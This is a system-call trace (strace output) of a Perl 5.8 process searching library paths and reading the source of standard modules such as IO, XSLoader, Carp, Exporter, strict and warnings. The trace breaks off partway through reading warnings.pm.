10890 07:35:08.636168 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0c28) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.636178 _llseek(1, 0, [0], SEEK_CUR) = 0
10890 07:35:08.636189 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
10890 07:35:08.636201 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
10890 07:35:08.636220 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
10890 07:35:08.636272 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
10890 07:35:08.636319 getppid()         = 10888
10890 07:35:08.636379 stat64("/etc/perl/IO.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.636393 stat64("/etc/perl/IO.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.636406 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.636419 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.636432 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.636445 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.636483 stat64("/usr/lib/perl5/IO.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.636496 stat64("/usr/lib/perl5/IO.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.636509 stat64("/usr/share/perl5/IO.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.636521 stat64("/usr/share/perl5/IO.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.636534 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.636547 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
10890 07:35:08.636568 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 5
10890 07:35:08.636582 ioctl(5, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0638) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.636593 _llseek(5, 0, [0], SEEK_CUR) = 0
10890 07:35:08.636617 read(5, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
10890 07:35:08.636673 stat64("/etc/perl/XSLoader.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.636691 stat64("/etc/perl/XSLoader.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.636704 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.636717 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.636731 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.636744 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.636758 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.636769 stat64("/usr/lib/perl5/XSLoader.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.636783 stat64("/usr/share/perl5/XSLoader.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.636795 stat64("/usr/share/perl5/XSLoader.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.636808 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.636821 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
10890 07:35:08.636842 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
10890 07:35:08.636855 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0188) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.636866 _llseek(8, 0, [0], SEEK_CUR) = 0
10890 07:35:08.636885 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
10890 07:35:08.637255 brk(0x8195000)    = 0x8195000
10890 07:35:08.637577 _llseek(8, 3407, [3407], SEEK_SET) = 0
10890 07:35:08.637595 _llseek(8, 0, [3407], SEEK_CUR) = 0
10890 07:35:08.637606 close(8)          = 0
10890 07:35:08.637651 stat64("/etc/perl/Carp.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.637667 stat64("/etc/perl/Carp.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.637680 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.637693 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.637707 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.637720 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.637734 stat64("/usr/lib/perl5/Carp.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.637746 stat64("/usr/lib/perl5/Carp.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.637759 stat64("/usr/share/perl5/Carp.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.637771 stat64("/usr/share/perl5/Carp.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.637784 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.637796 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.637810 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.637823 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
10890 07:35:08.637844 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
10890 07:35:08.637859 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0188) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.637870 _llseek(8, 0, [0], SEEK_CUR) = 0
10890 07:35:08.637888 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
10890 07:35:08.638331 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
10890 07:35:08.638359 read(8, "", 4096) = 0
10890 07:35:08.638371 close(8)          = 0
10890 07:35:08.638392 stat64("/etc/perl/Exporter.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.638406 stat64("/etc/perl/Exporter.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.638420 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.638433 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.638447 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.638464 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.638478 stat64("/usr/lib/perl5/Exporter.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.638490 stat64("/usr/lib/perl5/Exporter.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.638504 stat64("/usr/share/perl5/Exporter.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.638516 stat64("/usr/share/perl5/Exporter.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.638539 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.638552 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.638566 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.638579 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
10890 07:35:08.638600 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
10890 07:35:08.638615 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0188) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.638627 _llseek(8, 0, [0], SEEK_CUR) = 0
10890 07:35:08.638644 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
10890 07:35:08.639100 _llseek(8, 2217, [2217], SEEK_SET) = 0
10890 07:35:08.639118 _llseek(8, 0, [2217], SEEK_CUR) = 0
10890 07:35:08.639129 close(8)          = 0
10890 07:35:08.639204 stat64("/etc/perl/strict.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639220 stat64("/etc/perl/strict.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639234 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639251 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639266 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639278 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639293 stat64("/usr/lib/perl5/strict.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639304 stat64("/usr/lib/perl5/strict.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639318 stat64("/usr/share/perl5/strict.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639330 stat64("/usr/share/perl5/strict.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639343 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639356 stat64("/usr/lib/perl/5.8/strict.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639369 stat64("/usr/share/perl/5.8/strict.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639382 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
10890 07:35:08.639403 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
10890 07:35:08.639419 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0188) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.639431 _llseek(8, 0, [0], SEEK_CUR) = 0
10890 07:35:08.639450 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
10890 07:35:08.639603 _llseek(8, 598, [598], SEEK_SET) = 0
10890 07:35:08.639619 _llseek(8, 0, [598], SEEK_CUR) = 0
10890 07:35:08.639629 close(8)          = 0
10890 07:35:08.639668 stat64("/etc/perl/warnings.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639682 stat64("/etc/perl/warnings.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639696 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639709 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639723 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639735 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639750 stat64("/usr/lib/perl5/warnings.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639762 stat64("/usr/lib/perl5/warnings.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639775 stat64("/usr/share/perl5/warnings.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639787 stat64("/usr/share/perl5/warnings.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639800 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639813 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639826 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.639839 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
10890 07:35:08.639864 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
10890 07:35:08.639879 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0188) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.639890 _llseek(8, 0, [0], SEEK_CUR) = 0
10890 07:35:08.639909 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> 